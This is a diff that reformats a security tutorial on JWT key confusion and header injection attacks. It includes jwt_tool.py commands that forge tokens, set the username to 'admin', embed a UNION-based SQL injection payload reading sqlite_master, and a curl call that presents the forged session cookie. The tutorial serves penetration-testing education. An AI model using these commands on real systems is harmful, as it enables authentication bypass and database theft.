@@ -64,7 +64,9 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
 ```
 This means we can make our own JWTs with a forged signature created using the public key and the HS256 algorithm to bypass the authentication completely. Since the JWT was already signed using the public key, the signature verification by the application is successful leading to a successful key confusion attack.
 
-> **_NOTE:_** In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as [jwt_forgery.py](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone).
+!!!info Note
+In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as [jwt_forgery.py](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone).
+!!!
 
 ### JWT header parameter injection
 Although only the `alg` parameter is mandatory, in practice the header often contain other parameters:
@@ -124,20 +126,23 @@ Of course you can make the parameter point to any file, but the `/dev/null` file
 
 ## JSON Web Token Toolkit
 The [jwt_tool.py](https://github.com/ticarpi/jwt_tool) is a very useful toolkit for validating, forging, scanning and tampering with JSON Web Tokens. It can test for a variety of known exploits such as the RS/HS256 public key mismatch vulnerability discussed in this article. Let's look at an example that leverages the key confusion attack on a JWT token when we have access to the public key. The `-X k` flag can be used for the key confusion attack.
-```bash
-python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
+
+```console
+$ python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
 ```
+
 Using this tool we can even inject SQL queries in certain payload fields that we are interested in. We can do this using the `-I` flag, specifying the claim `-pc` and value `-pv` of the payload to tamper. In this example we are changing the current username to be 'admin'.
-```
-python3 jwt_tool.py <JWT_TOKEN> -I -pc username -pv "admin" -X k -pk key.pem
+
+```console
+$ python3 jwt_tool.py <JWT_TOKEN> -I -pc username -pv "admin" -X k -pk key.pem
 ```
 
 ### SQL Injection Payloads
 If certain functions on the web application are vulnerable to SQL injection, we can even modify the JWT token to include an injection payload of our choice.
-```bash
-python3 jwt_tool.py <JWT_TOKEN> -I -pc username -pv "' AND 1 = 0 UNION ALL SELECT 1,group_concat(sql),3 FROM sqlite_master--" -X k -pk public.pem
+```console
+$ python3 jwt_tool.py <JWT_TOKEN> -I -pc username -pv "' AND 1 = 0 UNION ALL SELECT 1,group_concat(sql),3 FROM sqlite_master--" -X k -pk public.pem
 ```
 We can then use the newly generated fake token and set it as our session cookie:
-```bash
-curl http://<Host>:<PORT>/ -b 'session=<FAKE-TOKEN>'
+```console
+$ curl http://<Host>:<PORT>/ -b 'session=<FAKE-TOKEN>'
 ```
